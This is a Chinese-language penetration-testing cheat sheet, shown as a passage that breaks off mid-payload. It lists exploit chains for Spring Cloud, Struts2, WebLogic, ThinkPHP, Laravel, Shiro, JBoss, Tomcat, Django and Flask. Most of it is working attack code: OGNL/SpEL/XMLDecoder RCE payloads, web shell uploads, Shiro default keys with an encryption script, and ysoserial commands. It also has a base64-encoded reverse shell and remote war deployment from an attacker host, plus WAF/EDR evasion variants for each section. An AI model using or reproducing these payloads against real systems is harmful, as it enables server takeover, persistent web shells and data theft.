**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_字符串拼接绕过_
```
# 绕过关键字过滤
${T(java.lang.Run"+"time).getRun"+"time().exec("id")}
#{T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("exec",T(String)).invoke(T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

**2. 反射绕过**
_反射绕过_
```
# 使用反射
#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# 使用ScriptEngine
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\"id\\")")}
```

---

### Spring Cloud漏洞  `spring-cloud`
Spring Cloud相关漏洞利用
子类：**Spring Cloud** · tags: `spring` `cloud` `rce` `deserialization`

**前置条件：** 使用Spring Cloud；存在漏洞版本

**攻击链：**

**1. 1. Spring Cloud Gateway RCE**
_Spring Cloud Gateway RCE_
```
# CVE-2022-22947
# 添加恶意路由
POST /actuator/gateway/routes/hack HTTP/1.1
Content-Type: application/json

{
  "id": "hack",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

# 刷新路由
POST /actuator/gateway/refresh

# 查看结果
GET /actuator/gateway/routes/hack
```

**2. 2. Spring Cloud Function SpEL**
_Spring Cloud Function SpEL注入_
```
# CVE-2022-22963
# 修改请求头触发SpEL
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
Content-Type: text/plain

payload
```

**3. 3. Spring Cloud Netflix**
_Spring Cloud Netflix漏洞_
```
# CVE-2020-5410 目录遍历
GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

# Eureka Server SSRF
POST /eureka/apps
# 配置serviceUrl指向内网服务
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码绕过
..%252f = ..%2f = ../

# 双重URL编码
..%252f..%252f
```

---

### Struts2远程代码执行  `struts2-rce`
Apache Struts2框架RCE漏洞
子类：**Struts2** · tags: `struts2` `rce` `java` `apache`

**前置条件：** 使用Struts2框架；存在漏洞版本

**攻击链：**

**1. 1. S2-045漏洞**
_S2-045 Content-Type注入_
```
# CVE-2017-5638
# Content-Type头注入
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

**2. 2. S2-046漏洞**
_S2-046 Content-Disposition注入_
```
# CVE-2017-5638
# Content-Disposition注入
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}"

# 完整RCE
Content-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

**3. 3. S2-057漏洞**
_S2-057 URL命名空间注入_
```
# CVE-2018-11776
# URL命名空间注入
http://target/${(111+111)}/test.action
# 如果返回222则存在漏洞

# RCE
http://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action
```

**4. 4. S2-061/S2-062漏洞**
_S2-061/062 OGNL注入_
```
# CVE-2020-17530
# OGNL表达式注入
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d

# 解码后
id=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec('id')}
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
%{#cmd} = %25%7b%23cmd%7d

# Unicode编码
\u0025{#cmd}

# 双重编码
%2525%257b%2523cmd%257d
```

**2. 表达式变体**
_表达式变体绕过_
```
# 不同表达式语法
${...}
%{...}
#{...}
@{...}

# 使用静态方法
@java.lang.Runtime@getRuntime()
new java.lang.ProcessBuilder()
```

---

### Struts2 OGNL表达式注入  `struts2-ognl`
Struts2 OGNL表达式注入技术详解
子类：**Struts2 OGNL** · tags: `struts2` `ognl` `expression` `injection`

**前置条件：** 使用Struts2框架；存在OGNL注入点

**攻击链：**

**1. 1. OGNL基础语法**
_OGNL基础语法_
```
# 访问对象属性
#object.property
#object['property']

# 调用方法
#object.method()
#object.method(arg1, arg2)

# 静态方法调用
@package.ClassName@method()
@java.lang.Runtime@getRuntime()

# 创建对象
new java.lang.String("test")
new java.lang.ProcessBuilder(new String[]{"id"})
```

**2. 2. 绕过安全限制**
_绕过安全限制_
```
# 获取DEFAULT_MEMBER_ACCESS
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS

# 设置成员访问权限
#_memberAccess=#dm

# 清除排除类
#ognlUtil.getExcludedClasses().clear()
#ognlUtil.getExcludedPackageNames().clear()

# 完整绕过
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
```

**3. 3. 命令执行技巧**
_命令执行技巧_
```
# 使用Runtime
#cmd='id'
#cmds={'/bin/bash','-c',#cmd}
#p=new java.lang.ProcessBuilder(#cmds)
#process=#p.start()

# 获取输出
#is=#process.getInputStream()
#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
@org.apache.commons.io.IOUtils@copy(#is,#ros)

# 字符串输出
@org.apache.commons.io.IOUtils@toString(#process.getInputStream())
```

**4. 4. 文件操作**
_文件操作_
```
# 读取文件
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()

# 写入文件
new java.io.FileOutputStream("shell.jsp").write(new sun.misc.BASE64Decoder().decodeBuffer("BASE64_SHELL").getBytes())

# 列出目录
new java.io.File("/").list()
```

**WAF/EDR 绕过变体：**

**1. 字符编码绕过**
_字符编码绕过_
```
# Unicode编码
\u0069d = id
\u0027 = '

# 十六进制
\x69\x64 = id

# 字符串拼接
"i"+"d" = "id"
'id'.substring(0,2)
```

**2. 反射绕过**
_反射绕过_
```
# 使用反射调用
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")
```

---

### WebLogic远程代码执行  `weblogic-rce`
Oracle WebLogic Server RCE漏洞
子类：**WebLogic** · tags: `weblogic` `rce` `java` `oracle`

**前置条件：** 使用WebLogic Server；存在漏洞版本

**攻击链：**

**1. 1. CVE-2017-10271**
_CVE-2017-10271 XMLDecoder_
```
# XMLDecoder反序列化
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**2. 2. CVE-2019-2725**
_CVE-2019-2725 AsyncResponseService_
```
# 新版XMLDecoder绕过
POST /_async/AsyncResponseService HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**3. 3. CVE-2020-14882**
_CVE-2020-14882 Console RCE_
```
# 未授权访问+命令执行
# 登录绕过
GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1

# 命令执行
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 路径编码绕过**
_路径编码绕过_
```
# 不同编码方式
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal
```

**2. XML变体**
_XML变体绕过_
```
# 使用不同XML标签
<void class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<string>id</string>
</void>
</void>

# 使用数组形式
<array class="java.lang.String" length="1">
<void index="0"><string>id</string></void>
</array>
```

---

### WebLogic T3协议攻击  `weblogic-t3`
WebLogic T3协议反序列化漏洞
子类：**WebLogic T3** · tags: `weblogic` `t3` `deserialization` `java`

**前置条件：** WebLogic开放T3端口；存在漏洞版本

**攻击链：**

**1. 1. 探测T3服务**
_探测T3服务_
```
# 扫描T3端口(默认7001)
nmap -sV -p 7001 target

# T3握手
echo "t3 12.2.1" | nc target 7001

# 如果返回HELO则存在T3服务
```

**2. 2. 使用工具攻击**
_使用工具攻击_
```
# 使用weblogic_exploit
git clone https://github.com/0xn0ne/weblogicScanner
cd weblogicScanner
python3 weblogic.py -t target -p 7001

# 使用WebLogicTool
java -jar WebLogicTool.jar -target target:7001 -cmd "id"

# 使用ysoserial
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/pwned"
```

**3. 3. 构造恶意T3请求**
_构造恶意T3请求_
```
# Python脚本构造T3请求
import socket
import struct

def send_t3_payload(target, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    
    # T3握手
    sock.send(b"t3 12.2.1\n")
    response = sock.recv(1024)
    
    # 发送恶意序列化对象
    # 构造包含恶意对象的T3请求
    sock.send(payload)
    sock.close()

# 使用ysoserial生成payload
# java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

**WAF/EDR 绕过变体：**

**1. Gadget链选择**
_Gadget链选择_
```
# 不同Gadget链
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# 根据目标环境选择合适的链
```

---

### WebLogic IIOP协议攻击  `weblogic-iiop`
WebLogic IIOP协议反序列化漏洞
子类：**WebLogic IIOP** · tags: `weblogic` `iiop` `deserialization` `corba`

**前置条件：** WebLogic开放IIOP端口；存在漏洞版本

**攻击链：**

**1. 1. 探测IIOP服务**
_探测IIOP服务_
```
# 扫描IIOP端口	nmap -sV -p 7001 target

# IIOP使用相同端口
# 检测是否支持IIOP
# 使用工具检测
```

**2. 2. CVE-2020-2551**
_CVE-2020-2551利用_
```
# 使用weblogic_CVE_2020_2551
git clone https://github.com/Y4er/CVE-2020-2551
cd CVE-2020-2551

# 编译并运行
mvn package
java -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001

# 使用JRMP监听
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"
```

**3. 3. 构造IIOP请求**
_构造IIOP请求_
```
# 使用Python构造
# 需要安装相关库
pip install idna

# 使用JNDI注入
# 构造恶意JNDI引用
String jndiURL = "iiop://attacker:1099/Exploit";
Context ctx = new InitialContext();
ctx.lookup(jndiURL);

# 使用JNDIExploit工具
java -jar JNDIExploit.jar -i attacker_ip
```

**WAF/EDR 绕过变体：**

**1. 协议切换**
_协议切换绕过_
```
# 在T3和IIOP之间切换
# 如果T3被禁用，尝试IIOP
# 使用不同协议绕过检测
```

---

### ThinkPHP远程代码执行  `thinkphp-rce`
ThinkPHP框架RCE漏洞
子类：**ThinkPHP** · tags: `thinkphp` `rce` `php` `framework`

**前置条件：** 使用ThinkPHP框架；存在漏洞版本

**攻击链：**

**1. 1. ThinkPHP 5.x RCE**
_ThinkPHP 5.0.x RCE_
```
# ThinkPHP 5.0.x RCE
# 方法调用
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

# 写入WebShell
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>

# 执行系统命令
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

**2. 2. ThinkPHP 5.1.x RCE**
_ThinkPHP 5.1.x RCE_
```
# ThinkPHP 5.1.x RCE
?s=index/think\Request/input&filter[]=system&data=id
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/think\Template/driver/file/write&cacheFile=shell.php&content=%3C%3Fphp%20eval($_POST[cmd]);%3F%3E
```

**3. 3. ThinkPHP 5.0.23 RCE**
_ThinkPHP 5.0.23 RCE_
```
# POST方法
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# 写入Shell
_method=__construct&filter[]=file_put_contents&method=get&server[REQUEST_METHOD]=shell.php&get[]=<?php eval($_POST[cmd]);?>
```

**4. 4. 信息收集**
_信息收集_
```
# 获取ThinkPHP版本
# 查看响应头
X-Powered-By: ThinkPHP 5.0.x

# 访问特定页面
/index.php?s=/index/\think\app/init
/index.php?s=/index/\think\Request/input

# 错误信息泄露
# 触发错误查看版本
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# 大小写混合
?s=/Index/\Think\App/invokefunction

# 双重编码
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction
```

**2. 路径变体**
_路径变体绕过_
```
# 不同路径格式
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# 使用不同入口点
/index.php?s=...
/?s=...
/public/index.php?s=...
```

---

### Laravel远程代码执行  `laravel-rce`
Laravel框架RCE漏洞
子类：**Laravel** · tags: `laravel` `rce` `php` `framework`

**前置条件：** 使用Laravel框架；存在漏洞版本或配置

**攻击链：**

**1. 1. CVE-2021-3129**
_CVE-2021-3129 Ignition RCE_
```
# Laravel Ignition RCE
# 使用工具
git clone https://github.com/zhzyker/CVE-2021-3129
cd CVE-2021-3129
python3 exp.py -t http://target

# 手动利用
# 需要发送Phar反序列化payload
# 使用phpggc生成
phpggc Laravel/RCE1 system id > payload

# 发送请求
POST /_ignition/health-check HTTP/1.1
Content-Type: application/json

{"solution":"...","parameters":{"viewFile":"phar://..."}}
```

**2. 2. 调试模式信息泄露**
_调试模式信息泄露_
```
# APP_DEBUG=true信息泄露
# 访问触发错误的页面
# 查看堆栈跟踪中的敏感信息

# 可能泄露:
- 数据库凭证
- API密钥
- 环境变量
- 服务器路径
- 源代码片段
```

**3. 3. .env文件泄露**
_.env文件泄露_
```
# 尝试访问.env文件
GET /.env HTTP/1.1
GET /../.env HTTP/1.1
GET /public/.env HTTP/1.1

# .env文件包含:
APP_KEY=base64:...
DB_HOST=localhost
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=password
```

**4. 4. APP_KEY利用**
_APP_KEY利用_
```
# 获取APP_KEY后
# 可以伪造Cookie
# 解密加密数据

# 使用工具解密
php artisan decrypt <encrypted_value>

# 伪造管理员Cookie
# 需要了解应用加密方式
```

**WAF/EDR 绕过变体：**

**1. 路径绕过**
_路径绕过_
```
# 尝试不同路径
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env
```

---

### Apache Shiro反序列化  `shiro-deserialize`
Apache Shiro RememberMe反序列化漏洞
子类：**Apache Shiro** · tags: `shiro` `deserialization` `java` `rememberme`

**前置条件：** 使用Apache Shiro；存在漏洞版本

**攻击链：**

**1. 1. 检测Shiro**
_检测Shiro框架_
```
# 检测rememberMe Cookie
# 响应中有rememberMe=deleteMe表示使用Shiro

# 使用工具检测
git clone https://github.com/sv3nbeast/ShiroScan
cd ShiroScan
java -jar shiro_scan.jar -t http://target

# 或使用Burp插件
# ShiroScan Burp插件
```

**2. 2. 使用ysoserial生成payload**
_生成恶意payload_
```
# 生成恶意序列化对象
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser

# 使用Shiro内置密钥加密
# 默认密钥: kPH+bIxk5D2deZiIxcaaaA==

# Python加密脚本
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # 生成payload
    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()
    
    # AES加密
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    
    # PKCS5Padding
    pad = 16 - len(payload) % 16
    payload += bytes([pad]) * pad
    
    encrypted = cipher.encrypt(payload)
    return base64.b64encode(encrypted).decode()
```

**3. 3. 发送恶意请求**
_发送恶意请求_
```
# 使用curl
curl -H "Cookie: rememberMe=<ENCODED_PAYLOAD>" http://target

# 使用工具
git clone https://github.com/insightglacier/Shiro_exploit
cd Shiro_exploit
python3 shiro_exploit.py -t http://target -c "id"

# 使用ShiroAttack
git clone https://github.com/acgbfull/ShiroAttack
cd ShiroAttack
java -jar ShiroAttack.jar
```

**4. 4. 常见密钥列表**
_常见密钥列表_
```
# 常见Shiro密钥
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0F8SZSnWd+Zw==
6ZmI6I2j5Y+R54aHjOqYzg==

# 尝试不同密钥
# 或爆破密钥
```

**WAF/EDR 绕过变体：**

**1. Gadget链选择**
_Gadget链选择_
```
# 不同Gadget链
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# 根据目标环境选择
# 某些链可能被过滤
```

**2. 密钥爆破**
_密钥爆破_
```
# 使用工具爆破密钥
git clone https://github.com/insightglacier/Shiro_exploit
python3 shiro_exploit.py -t http://target -f keys.txt

# 或使用ShiroScan
java -jar shiro_scan.jar -t http://target -f keys.txt
```

---

### JBoss漏洞利用  `jboss-vuln`
JBoss应用服务器漏洞
子类：**JBoss** · tags: `jboss` `rce` `java` `deserialization`

**前置条件：** 使用JBoss服务器；存在漏洞版本

**攻击链：**

**1. 1. JMXInvokerServlet反序列化**
_JMXInvokerServlet反序列化_
```
# CVE-2015-7501
# 发送恶意序列化对象
POST /invoker/JMXInvokerServlet HTTP/1.1
Content-Type: application/x-java-serialized-object

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser

# 发送
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet
```

**2. 2. JMX Console部署War包**
_JMX Console部署War包_
```
# 访问JMX Console
http://target/jmx-console/

# 查找deploy方法
# 找到 jboss.system:service=MainDeployer

# 部署远程War包
# 使用deploy方法，URL参数指向恶意War
http://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war

# 访问部署的Shell
http://target/shell/cmd.jsp?cmd=id
```

**3. 3. BSHDeployer部署**
_BSHDeployer部署_
```
# 使用BeanShell部署
# 找到 jboss.scripts:service=BSHDeployer

# 执行BeanShell脚本
# 通过createScriptDeployment方法

# 构造恶意脚本
import java.io.*;
Runtime rt = Runtime.getRuntime();
Process p = rt.exec("id");
InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is));
String line;
while((line = reader.readLine()) != null) {
    print(line);
}
```

**4. 4. 使用工具**
_使用JexBoss工具_
```
# JexBoss
git clone https://github.com/joaomatosf/jexboss
cd jexboss
python jexboss.py -host http://target

# 自动化利用
python jexboss.py -mode file-scan -file hosts.txt
```

**WAF/EDR 绕过变体：**

**1. 端点变体**
_端点变体_
```
# 不同端点
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/
```

---

### Apache Tomcat漏洞  `tomcat-vuln`
Apache Tomcat服务器漏洞利用
子类：**Tomcat** · tags: `tomcat` `rce` `java` `manager`

**前置条件：** 使用Tomcat服务器；存在漏洞版本或配置

**攻击链：**

**1. 1. Manager App弱口令**
_Manager App弱口令_
```
# 访问Manager App
http://target/manager/html

# 常见弱口令
tomcat:tomcat
admin:admin
admin:tomcat

# 使用工具爆破
hydra -l tomcat -P passwords.txt target http-get /manager/html
```

**2. 2. 部署War包**
_部署War包_
```
# 生成恶意War包
# cmd.jsp
<%@ page import="java.util.*,java.io.*"%>
<% String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) { out.println(line); }
%>

# 打包
jar cvf shell.war cmd.jsp

# 通过Manager上传
curl -u tomcat:tomcat -T shell.war "http://target/manager/deploy?path=/shell"

# 访问Shell
http://target/shell/cmd.jsp?cmd=id
```

**3. 3. CVE-2020-1938 Ghostcat**
_CVE-2020-1938 Ghostcat_
```
# AJP文件读取/包含
# 使用工具
git clone https://github.com/chaitin/xray
cd xray
./xray_linux_amd64 webscan --plugins phantomjs --url http://target

# 或使用专用工具
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target
```

**4. 4. PUT方法任意文件写入**  _[windows]_
_PUT方法任意文件写入_
```
# CVE-2017-12615
# Windows下PUT方法写文件
PUT /shell.jsp%20 HTTP/1.1
Host: target
Content-Length: 24

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# 或使用::$DATA
PUT /shell.jsp::$DATA HTTP/1.1

# 或使用/
PUT /shell.jsp/ HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 文件名绕过**
_文件名绕过_
```
# 不同文件名变体
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP
```

---

### Django框架漏洞  `django-vuln`
Django框架安全漏洞
子类：**Django** · tags: `django` `python` `framework` `sql`

**前置条件：** 使用Django框架；存在漏洞版本

**攻击链：**

**1. 1. SQL注入**
_CVE-2020-7471 SQL注入_
```
# CVE-2020-7471
# 通过PostgreSQL输入验证绕过
# 使用JSONField/HStoreField

# 构造恶意查询
Model.objects.filter(data__contains={"key": "value; SELECT SLEEP(5);--"})

# 或使用ArrayField
Model.objects.filter(tags__contains=["tag'); SELECT SLEEP(5);--"])

# 触发SQL注入
```

**2. 2. 调试模式信息泄露**
_调试模式信息泄露_
```
# DEBUG=True时
# 错误页面泄露:
- 源代码
- 环境变量
- 数据库配置
- SECRET_KEY
- 服务器路径

# 访问不存在的页面触发错误
http://target/nonexistent

# 或触发异常
```

**3. 3. SECRET_KEY利用**
_SECRET_KEY利用_
```
# 获取SECRET_KEY后
# 可以:
# 1. 签名伪造Session
# 2. 签名伪造CSRF Token
# 3. 密码重置Token

# 使用django-session-cleanup工具
# 或手动解签

import django.core.signing as signing

# 解签Session
signing.loads(session_value, key=SECRET_KEY)

# 签名伪造Session
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)
```

**4. 4. 路径遍历**
_路径遍历漏洞_
```
# CVE-2021-28658
# Django静态文件路径遍历
GET /static/../../../../etc/passwd

# 使用工具检测
curl http://target/static/../../../../etc/passwd
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
/static/%2e%2e/%2e%2e/etc/passwd

# 双重编码
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode编码
/static/..%c0%af..%c0%af/etc/passwd
```

---

### Flask框架漏洞  `flask-vuln`
Flask框架安全漏洞
子类：**Flask** · tags: `flask` `python` `framework` `ssti`

**前置条件：** 使用Flask框架；存在漏洞配置

**攻击链：**

**1. 1. SSTI模板注入**
_SSTI模板注入_
```
# Jinja2模板注入探测
{{7*7}}
${7*7}
<%= 7*7 %>

# 如果返回49则存在SSTI

# 获取配置
{{config}}
{{self.__class__}}

# 命令执行
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**2. 2. SECRET_KEY利用**
_SECRET_KEY利用_
```
# Flask Session签名
# 获取SECRET_KEY后可以伪造Session

# 解签Session
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# 解签
def decode_session(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.loads(cookie_value)

# 签名伪造
def encode_session(data, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# 伪造管理员Session
fake_session = encode_session({"user_id": 1, "is_admin": True}, SECRET_KEY)
```

**3. 3. 调试模式RCE**
_调试模式RCE_
```
# Flask Debug模式
# 访问/debug或/console
# 可以执行任意Python代码

# Werkzeug Debug Console
# 访问:
http://target/console

# 执行代码
import os; os.system('id')
__import__('os').system('id')
```

**4. 4. PIN码绕过**
_PIN码绕过_
```
# Flask Debug PIN
# 需要获取:
# 1. 用户名
# 2. modname
# 3. app路径
# 4. MAC地址

# 读取信息
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].environ}}

# 计算PIN
# 使用脚本计算Werkzeug PIN
```

**WAF/EDR 绕过变体：**

**1. SSTI绕过**
_SSTI绕过_
```
# 过滤绕过
# 使用attr
{{''|attr('__class__')|attr('__mro__')}}

# 使用request
{{request|attr('application')|attr('__globals__')}}

# 使用字符串拼接
{{'__cla'~'ss__'}}

# 使用编码
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

### WebLogic XMLDecoder  `weblogic-xmldecoder`
利用WebLogic Server中XMLDecoder反序列化漏洞(CVE-2017-10271/CVE-2017-3506)实现远程代码执行
子类：**WebLogic** · tags: `weblogic` `xmldecoder` `rce`

**前置条件：** 目标运行WebLogic Server；存在/wls-wsat/或/_async/路径；XMLDecoder组件未被禁用；WebLogic版本存在漏洞(10.3.6.0/12.1.3.0等)

**攻击链：**

**1. 探测WebLogic版本和路径**  _[linux]_
_探测WebLogic服务器版本、开放端口和可利用的端点_
```
# 检测WebLogic控制台
curl -sI "http://target:7001/console/" | head -5

# 检测wls-wsat端点(CVE-2017-10271)
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | head -20

# 检测AsyncResponseService端点(CVE-2019-2725)
curl -s "http://target:7001/_async/AsyncResponseService" | head -20

# 检测T3协议
nmap -sV -p 7001 --script weblogic-t3-info target
```

**2. CVE-2017-10271 XMLDecoder RCE**  _[linux]_
_通过SOAP请求中的WorkContext注入XMLDecoder反序列化payload实现命令执行_
```
curl -v "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/test_rce.txt</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
